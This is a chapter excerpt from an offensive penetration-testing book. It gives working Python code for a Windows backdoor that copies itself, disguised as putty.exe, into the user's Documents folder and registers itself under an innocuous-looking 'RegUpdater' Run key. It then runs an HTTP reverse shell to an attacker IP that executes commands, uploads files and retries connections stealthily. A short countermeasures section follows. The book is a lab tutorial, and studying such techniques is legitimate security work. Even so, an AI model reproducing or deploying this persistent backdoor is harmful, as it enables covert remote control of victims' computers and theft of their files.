<pre class="packt_figure2"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/># Persistence<br class="title-page-name"/><br class="title-page-name"/>import os # needed for getting working directory<br class="title-page-name"/>import shutil # needed for file copying<br class="title-page-name"/>import subprocess # needed for getting user profile<br class="title-page-name"/>import _winreg as wreg # needed for editing registry DB<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Reconn Phase<br class="title-page-name"/><br class="title-page-name"/>path = os.getcwd().strip('/n') #Get current working directory where the backdoor gets executed, we use the output to build our source path<br class="title-page-name"/><br class="title-page-name"/>Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')<br class="title-page-name"/>#Get USERP ROFILE which contains the username of the profile and store it in userprof variable , we use the output to build our destination path<br class="title-page-name"/>#Other way to discover the userprofile is via os.getenv('userprofile') , both will give the same result <br class="title-page-name"/><br class="title-page-name"/>destination = userprof.strip('\n\r') + '\\Documents\\' +'putty.exe'<br class="title-page-name"/>#build the destination path where we copy your backdoor - in our example we choosed C:\Users\&lt;UserName&gt;\Documents\<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># First and Second Phases<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>if not os.path.exists(destination): # this if statement will be False next time we run the script because our putty.exe will be already copied in destination <br class="title-page-name"/>                                     <br class="title-page-name"/>    #First time our backdoor gets executed<br class="title-page-name"/>    #Copy our Backdoor to C:\Users\&lt;UserName&gt;\Documents\<br class="title-page-name"/>    shutil.copyfile(path+'\putty.exe', destination)<br class="title-page-name"/>    <br class="title-page-name"/><br class="title-page-name"/>    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,<br class="title-page-name"/>                         wreg.KEY_ALL_ACCESS)<br class="title-page-name"/>    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)<br class="title-page-name"/>    key.Close()<br class="title-page-name"/>    #create a new registry string called RegUpdater pointing to our<br class="title-page-name"/>    #new backdoor path (destination)<br class="title-page-name"/><br class="title-page-name"/>#If the script worked fine, out putty.exe should be copied to C:\Users\&lt;UserName&gt;\Documents\ and a new registry key called 'RegUpdater' should be created<br class="title-page-name"/>#and pointing to C:\Users\&lt;UserName&gt;\Documents\putty.exe </pre>
<p class="calibre2"><span class="calibre11">The </span><kbd class="calibre12">os.getcwd()</kbd><span class="calibre11"> function will get the current working directory for us.</span></p>
<p class="calibre2">Now, on the <kbd class="calibre12">Desktop</kbd> we make a folder named <kbd class="calibre12">Persistence</kbd> with the <kbd class="calibre12">putty.exe</kbd> that we downloaded for this section and the <kbd class="calibre12">Presistance.py</kbd> script shown previously.</p>
<p class="calibre2">Let's see the output of the <kbd class="calibre12">os.getcwd()</kbd> line using the Python interactive shell or the Python interactive window:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Open Command Prompt and navigate to the current working directory, which is Persistence. Start a Python interactive mode.</li>
<li value="2" class="calibre10">Execute <kbd class="calibre12">import os</kbd> and <kbd class="calibre12">print os.getcwd()</kbd>.</li>
</ol>
<ol start="3" class="calibre13">
<li value="3" class="calibre10">We get the current working directory here for our script. This result will be stored on the path variable:</li>
</ol>
<div class="packt_figure1"><img src="../images/00030.jpeg" class="calibre33"/></div>
<p class="calibre2">Looking back into the <kbd class="calibre12">Persistence.py</kbd> script, we invoke <kbd class="calibre12">set USERPROFILE</kbd> into the subprocess and use this step to grab the <kbd class="calibre12">USERPROFILE</kbd> name. Based on this, we can build our destination path, which is the <kbd class="calibre12">Documents</kbd> folder.</p>
<p class="calibre2">Enter the preceding <kbd class="calibre12">set USERPROFILE</kbd><span class="calibre11"> </span>variable into the Command Prompt. The output will be a little noisy, so we will split the output and store the second part in a variable called <kbd class="calibre12">userprof</kbd>. The splitting criterion or parameter is based on the <kbd class="calibre12">=</kbd> sign. Based on this, we will split the output into two sections. The second section will be stored in a variable called <kbd class="calibre12">userprof</kbd>. Once we know this information, we can build our destination path, which is the <kbd class="calibre12">Documents</kbd> folder.</p>
<p class="calibre2">We append <kbd class="calibre12">Documents</kbd> and the <kbd class="calibre12">putty.exe</kbd> string to have the destination's absolute path. Notice that the <kbd class="calibre12">&lt;UserName&gt;</kbd> here is not unknown anymore. At this point, we have accomplished our reconnaissance phase successfully. Moving on to check whether it's the first time that we have landed on this computer, we'll do this trick via an OS function called <kbd class="calibre12">path.exists()</kbd>. If <kbd class="calibre12">putty.exe</kbd> does not exist in the <kbd class="calibre12">Documents</kbd> folder, this means that it is the first time we are running our script here because the next time <span class="calibre11">PuTTY </span>will be copied, and the result of this <kbd class="calibre12">if</kbd> statement, <kbd class="calibre12">if not os.path.exists(destination):</kbd>, will be <kbd class="calibre12">false</kbd>. Since this is our first time, we will copy  <kbd class="calibre12">putty.exe</kbd>, which is the source variable.</p>
<p class="calibre2">Next, we will add a registry key in the user space. Note that we used a user space, not a machine space, on purpose. By using the user space, our script will work, even if we don't have admin privileges. We've named the registry key string <kbd class="calibre12">RegUpdater</kbd> (you can change it later to anything else) and point its value to our final destination. Here, we don't have a shell; it's just <kbd class="calibre12">putty.exe</kbd>. So, this part will be discussed in the next section. Before running this script, let's verify that we've got nothing in the registry database related to our script. Go to the <span class="calibre11">Registry Editor</span> by searching <kbd class="calibre12">regedit</kbd> at Windows Start, and our path will be <kbd class="calibre12">Computer\HKEY_CURRENT_USER|Software\Microsoft\Windows\CurrentVersion\Run</kbd>, as shown at the bottom of the following screenshot, which doesn't have anything in it now other than the <kbd class="calibre12">(Default)</kbd> entry:</p>
<div class="packt_figure1"><img src="../images/00031.jpeg" class="calibre41"/></div>
<p class="calibre2">Now, navigate to the <kbd class="calibre12">Documents</kbd> folder and ensure that there is nothing left to be done. Lastly, make sure that the PuTTY software itself is functional by opening it directly.</p>
<p class="calibre2">We'll run the script right now. If we do not get an exception or error, we'll verify the database of the registry. You'll notice that we've got our registry key pointing to this directory in <kbd class="calibre12">Documents</kbd> and also PuTTY has been copied to the <kbd class="calibre12">Documents</kbd> directory:</p>
<div class="packt_figure1"><img src="../images/00032.jpeg" class="calibre41"/></div>
<p class="calibre2">Now, close everything and restart VirtualBox. Once we boot our machine, if everything is working fine, we should see that <kbd class="calibre12">putty.exe</kbd> has been executed and the PuTTY window should pop up.</p>
<p class="calibre2">In the next section, we will make our HTTP reverse shell more intelligent and perform all of these steps within a built-in function.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Making a persistent HTTP reverse shell</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will make our HTTP reverse shell, which we coded earlier. Then, we will export it to EXE, and give it a try and test it. Now, almost all of the hard work is done already and at this point you should be familiar with every part of the code.</p>
<p class="calibre2">So for a quick recap, what we've done here is change <kbd class="calibre12">putty.exe</kbd> to <kbd class="calibre12">Persistence.exe</kbd>, which will be our EXE filename. The destination part will be the same, that is, the <kbd class="calibre12">Documents</kbd> folder. Finally, we start our HTTP reverse shell as usual. </p>
<p class="calibre2">The setup file here will be as follows:</p>
<pre class="packt_figure2"># py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/<br class="title-page-name"/><br class="title-page-name"/># Persistence Setup<br class="title-page-name"/><br class="title-page-name"/>from distutils.core import setup<br class="title-page-name"/>import py2exe , sys, os<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>sys.argv.append("py2exe")<br class="title-page-name"/>setup(<br class="title-page-name"/>    options = {'py2exe': {'bundle_files': 1}},<br class="title-page-name"/> <br class="title-page-name"/>    windows = [{'script': "Persistence.py"}], <br class="title-page-name"/>    zipfile = None,<br class="title-page-name"/>    <br class="title-page-name"/>)</pre>
<p class="calibre2">Let's try and export this code to EXE and the name here will be <kbd class="calibre12">Persistence</kbd>. Once it's done, it should be in the <kbd class="calibre12">dist</kbd> folder. Now, we will test it on a non-admin account just to show that no part on our shell requires admin privileges:</p>
<ol class="calibre13">
<li value="1" class="calibre10">From <span>Control Panel</span>, create a standard user.</li>
<li value="2" class="calibre10">Create a quick password.</li>
<li value="3" class="calibre10">Copy the persistence file to <kbd class="calibre12">C:</kbd>; so we can grab that file from the nonstandard user once we log in to that account.</li>
<li value="4" class="calibre10">Log off and log in with the new standard account.</li>
<li value="5" class="calibre10">Find the <kbd class="calibre12">Persistence</kbd> file and copy it on the desktop.</li>
<li value="6" class="calibre10">As usual, before running that shell, verify that we've got nothing in the registry database. This also applies for the <kbd class="calibre12">Documents</kbd> folder.</li>
<li value="7" class="calibre10">Set up our listener on the Kali side, that is, run our HTTP server.</li>
<li value="8" class="calibre10">Once done, notice that the registry key has been added successfully and at the end our file was able to find out the username and copy itself to the <kbd class="calibre12">Documents</kbd> folder successfully.</li>
</ol>
<ol start="9" class="calibre13">
<li value="9" class="calibre10">Let's verify that our shell is working as expected. Start the <span>Task Manager</span> on the Windows machine.</li>
<li value="10" class="calibre10">Let's start by running <kbd class="calibre12">ping 10.0.2.15</kbd> at the server side, which is the IP address of the Kali machine.</li>
<li value="11" class="calibre10">Check the <kbd class="calibre12">arp</kbd> table on the Windows side with <kbd class="calibre12">arp -a</kbd> and ensure that these commands are working fine.</li>
<li value="12" class="calibre10">After successfully terminating the process, we will delete the <kbd class="calibre12">Persistence.exe</kbd> file assuming that our target has deleted the shell file and restarted the client machine.</li>
<li value="13" class="calibre10">Log in again and, if you can see the shell on the Kali machine, we've been successful with our task.</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Tuning the connection attempts</h1>
                
            
            <article>
                
<p class="calibre2">In all our previous sections, we have assumed that the attacker and the target machine are in sync with time. This means that our server was up and listening all the time. Now, the question is: What happens if the attacker machine was offline for some reason or the connection did not happen properly? Well, our backdoor on the client side will crash and at the same time give a pop up as an error message and dump a text file indicating an exception error.</p>
<p class="calibre2">Currently, our Kali machine is not listening on any port. So, if the attacker initiates a TCP SYN to make a connection with us, now, since the port is closed, our Kali machine will reply with a TCP RST. Now, let's have a quick look at the packet level: </p>
<ol class="calibre13">
<li value="1" class="calibre10">Enable Wireshark on the attacker machine by executing <kbd class="calibre12">sudo wireshark</kbd> and you can see that our script is not running there</li>
<li value="2" class="calibre10">Start a new live capture</li>
<li value="3" class="calibre10">Set the filter to TCP</li>
<li value="4" class="calibre10">Log in on the Windows machine</li>
<li value="5" class="calibre10">Since we are not listening to port <kbd class="calibre12">80</kbd>, we are replying  with <span>TCP RST</span>, as you can see in the following screenshot:</li>
</ol>
<div class="packt_figure1"><img src="../images/00033.jpeg" class="calibre33"/></div>
<p class="calibre2">Also, on the target side, our script will crash and throws away an exception or log message. Navigate to the log file and you'll see that it says connection aborted because the target machine actively refused it, as shown <span class="calibre11">in the following screenshot</span>:</p>
<div class="packt_figure1"><img src="../images/00034.jpeg" class="calibre42"/></div>
<p class="calibre2">Log in with the <kbd class="calibre12">admin</kbd> account, where we have the Python compiler. So we'll fix this issue by creating an infinite loop with an exception handler, as shown here:</p>
<pre class="packt_figure2"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/># Tunning<br class="title-page-name"/><br class="title-page-name"/>import os<br class="title-page-name"/>import shutil<br class="title-page-name"/>import subprocess<br class="title-page-name"/>import _winreg as wreg<br class="title-page-name"/><br class="title-page-name"/>import requests <br class="title-page-name"/>import time<br class="title-page-name"/><br class="title-page-name"/>...<br class="title-page-name"/><br class="title-page-name"/>#Last phase is to start a reverse connection back to our kali machine<br class="title-page-name"/>import random<br class="title-page-name"/>def connect():<br class="title-page-name"/>    while True: <br class="title-page-name"/><br class="title-page-name"/>        req = requests.get('http://10.0.2.15')<br class="title-page-name"/>        command = req.text<br class="title-page-name"/>        <br class="title-page-name"/>        if 'terminate' in command:<br class="title-page-name"/>            return 1 <br class="title-page-name"/><br class="title-page-name"/>        elif 'grab' in command:<br class="title-page-name"/>        <br class="title-page-name"/>            grab,path=command.split('*')<br class="title-page-name"/>            if os.path.exists(path):<br class="title-page-name"/>                url = 'http://10.0.2.15/store'<br class="title-page-name"/>                files = {'file': open(path, 'rb')}<br class="title-page-name"/>                r = requests.post(url, files=files)<br class="title-page-name"/>            else:<br class="title-page-name"/>                post_response = requests.post(url='http://10.0.2.15', data=<br class="title-page-name"/>                                          '[-] Not able to find the file !' )<br class="title-page-name"/>            <br class="title-page-name"/>        else:<br class="title-page-name"/>            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/>            post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() )<br class="title-page-name"/>            post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() )<br class="title-page-name"/>    time.sleep(3)<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>while True:<br class="title-page-name"/>    try:<br class="title-page-name"/>        if connect()==1:<br class="title-page-name"/>                break<br class="title-page-name"/>    except:<br class="title-page-name"/>        sleep_for = random.randrange(1,10)<br class="title-page-name"/>        time.sleep( sleep_for )<br class="title-page-name"/>        #time.sleep( sleep_for ) #sleep for a random time between 1-10 minutes<br class="title-page-name"/>        pass</pre>
<p class="calibre2">As you can see, a new function called <kbd class="calibre12">connect()</kbd> is added to the script. So, using an exception handler, whatever the reason may be, if we get an exception for initiating the connection, we'll sleep for some random time between 1 to 10 seconds, and then try to connect again. In a real-world scenario, you've got to be more patient and make it from 1 to 10 minutes. In the end, we pass the exception instead of raising it here. Now, the question is: How to terminate the process, as we have two infinite loops? Since the single break command won't do the job for us, the trick here is, if we terminate, then we will break the whole function and retain a value of <kbd class="calibre12">1</kbd>. And if the connection function retains the value of <kbd class="calibre12">1</kbd>, then we will break the second loop, which will terminate the process eventually.</p>
<p class="calibre2">Now, let's quickly try and test this modification:</p>
<ol class="calibre13">
<li value="1" class="calibre10">As we've done earlier, export the script to EXE</li>
<li value="2" class="calibre10">Ensure that the <kbd class="calibre12">Documents</kbd> folder and the registry key<span> are empty</span></li>
<li value="3" class="calibre10">Double-click on <kbd class="calibre12">Persistence.exe</kbd> from the <kbd class="calibre12">dist</kbd> folder and run the script</li>
</ol>
<p class="calibre2">And once we run our script here, notice that the target keeps trying to reach us until we run our server and the connection attempts here will be anywhere between 1 to 10 seconds, as shown <span class="calibre11">in the following screenshot</span>:</p>
<div class="packt_figure1"><img src="../images/00035.jpeg" class="calibre33"/></div>
<p class="calibre2">Now, once we start our listener on the server side, we have completed three-way handshakes and got the <kbd class="calibre12">GET</kbd> request from our target, as shown in the following screenshot:</p>
<div class="packt_figure1"><img src="../images/00036.jpeg" class="calibre33"/></div>
<p class="calibre2">Check whether the registry key is there and whether the script has copied itself to <kbd class="calibre12">Documents</kbd>. So, the last thing to test is whether the termination process is working or not. Ping <kbd class="calibre12">10.0.2.15</kbd> and perform a <kbd class="calibre12">terminate</kbd>. You can see that <kbd class="calibre12">Persistence.exe</kbd> is gone from the Windows Task Manager.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Tips for preventing a shell breakdown</h1>
                
            
            <article>
                
<p class="calibre2">As we have explained earlier, We created a shell by creating a subprocess and passing the commands to this subprocess. Now, the point is that some commands cannot work properly using this technique, such as the <kbd class="calibre12">cls</kbd> and <kbd class="calibre12">clear</kbd> commands, both of which will not work in a shell. Now, for instance, let's say that we were able to get a shell to the client PC and later on we discovered some kind of Telnet or FTP server connected on the same internal network. Unfortunately, we cannot use the built-in Telnet client in the operating system from our shell and this is because once we do so, the server will prompt us with a username and password; this is called the interactive method and the shell will fail to handle these types of interaction.</p>
<p class="calibre2">One solution is to use a special Python library called <strong class="calibre4">Pexpect</strong>. Pexpect allows your script to interact with an application just as if a human were typing these commands. Now, last but not least, always test the command locally in a VirtualBox before sending it to your target.</p>
<p class="calibre2">There are couple of points to mention here. First, we have a problem with clear text. Now, all our traffic and file transfer was in clear text. This means that any IPS or network analyzer will easily pick up our commands and may block that connection or at least raise a flag to the system or the SOC team. Now, in <a target="_blank" href="part0080.html#2C9D00-f5e5253c9e4346ba8f07a93bc319b4b2" class="calibre8">Chapter 4</a>, <em class="calibre16">Catch Me If You Can!</em>, we will address this point by building a custom XOR encryption to encrypt all our traffic between the attacker and the target machine.</p>
<p class="calibre2">The second point is: What if the hacker IP address was dynamically changed? Let's say that the hacker is behind an ADSL or a proxy, where each time he connects to the internet his IP address will change. Remember that we configured our target to connect to a fixed IP address and eventually the connection will fail since that IP address will not be valid anymore.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Countermeasures</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will see how we can protect ourselves from the attacks we explained in this chapter. Now, if we think about it for a second: How could the attacker reach our internal host to begin with? Well, we rely on a social engineering attack along with a client-side attack to make it happen. The main key defense here is to start by securing people as they are the weakest points in the whole system. So you've got to start securing your staff on a regular basis with some management enforcement. Next, you should never rely on antivirus software, a sandbox, or VMware, as modern malware has built-in mechanisms to protect itself from being detected. Also, you should stay away from any suspicious software, especially cracked files. Before you install any software,if it was a legitimate software, verify file integrity using MD5 or the sha1 algorithm. If possible, use <strong class="calibre4">Data Leaking Prevention</strong> (<strong class="calibre4">DLP</strong>) to detect any file transfer on the endpoint or in the network transit path. Also, as a best practice, you can install something called <strong class="calibre4">Host-Based Intrusion Detection System</strong> (<strong class="calibre4">HIDS</strong>) to collect the operating system logs and notice any modification that is happening on the operating system logs. If possible, create a whitelist, and limit which process is allowed to run on the operating system. During the security awareness session, always inform nontechnical people to report any phishing email or suspicious files to the network security team or to the security operator or analyst.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Summary</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we started by preparing our attacker and target machines, and then proceeded to learn and code TCP and an HTTP reverse shell. For each of these reverse shells, we looked into data exfiltration and exporting the Python script into <kbd class="calibre12">.exe</kbd>, which made the attack independent of the Python compiler. We learned how to make the connection persistent. We also looked into tuning connection attempts and countermeasures to prevent the attacks we learned about.</p>
<p class="calibre2">In the next chapter, we'll cover DDNS, interactive Twitter, countermeasures, replicating Metasploit screen capturing, target directory navigation, and integrating low-level port scanners.</p>


            </article>

            
        </section>
    </body></html>